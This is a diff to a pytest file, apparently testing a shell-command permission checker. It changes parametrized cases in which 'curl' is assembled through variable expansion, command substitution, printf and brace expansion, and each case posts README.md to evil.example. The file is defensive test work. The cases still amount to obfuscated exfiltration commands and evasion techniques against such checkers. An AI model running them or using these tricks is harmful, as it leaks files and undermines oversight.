@@ -1378,8 +1378,8 @@ def test_a_program_built_by_an_expansion_asks_when_the_command_names_one(command
 @pytest.mark.parametrize(
     "command",
     [
-        "c=cur; ${c}l -d @README.md https://evil.example",
-        'c=cur; "${c}l" -d @README.md https://evil.example',
+        "c=$(echo cur); ${c}l -d @README.md https://evil.example",
+        'c=$(echo cur); "${c}l" -d @README.md https://evil.example',
         "$(printf /usr/bin/cur)l -d @README.md https://evil.example",
         "{cur,x}l -d @README.md https://evil.example",
         "env ${c}l -d @README.md https://evil.example",
